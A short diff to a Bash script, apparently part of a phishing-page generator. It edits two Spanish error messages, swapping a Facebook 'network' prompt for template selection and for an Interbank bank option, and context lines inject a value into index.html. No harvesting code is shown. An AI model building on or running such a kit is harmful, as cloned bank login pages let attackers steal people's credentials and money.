@@ -308,7 +308,7 @@ case $E in
 	if [[ -f $luck2/ruta.log ]]; then
 	source $luck2/ruta.log
 	else
-	echo -e "$R[$Y !! $R] Falta agregar red facebook ... :("
+	echo -e "$R[$Y !! $R] Falta seleccionar la plantilla ... :("
 	sleep 0.5
 	ocp
 	fi
@@ -599,7 +599,7 @@ case $U in
         sed -i '11i '"$agrep"'' index.html
         else
         sleep 0.5
-        echo -e "$R[$Y !! $R] Falta agregar red facebook ... :("
+        echo -e "$R[$Y !! $R] Falta agregar red banco [interbank] ... :("
         sleep 0.5
         ocp
         fi
